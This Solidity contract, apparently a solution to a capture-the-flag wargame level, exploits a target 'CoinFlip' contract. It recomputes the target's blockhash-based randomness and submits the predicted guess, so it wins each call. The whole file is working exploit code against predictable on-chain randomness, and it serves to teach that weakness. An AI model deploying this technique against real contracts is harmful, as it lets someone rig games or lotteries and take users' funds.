// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract AttackCoinFlip {
    ICoinFlip coinFlip;

    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(ICoinFlip _coinFlip) public {
        coinFlip = _coinFlip;
    }

    function attack() public {
        // copy the code from CoinFlip that generates the boolean
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }
        lastHash = blockValue;
        uint256 coinFlipped = blockValue / FACTOR;
        bool side = coinFlipped == 1 ? true : false;
        // make the call with the correct guess for the current block
        coinFlip.flip(side);
    }
}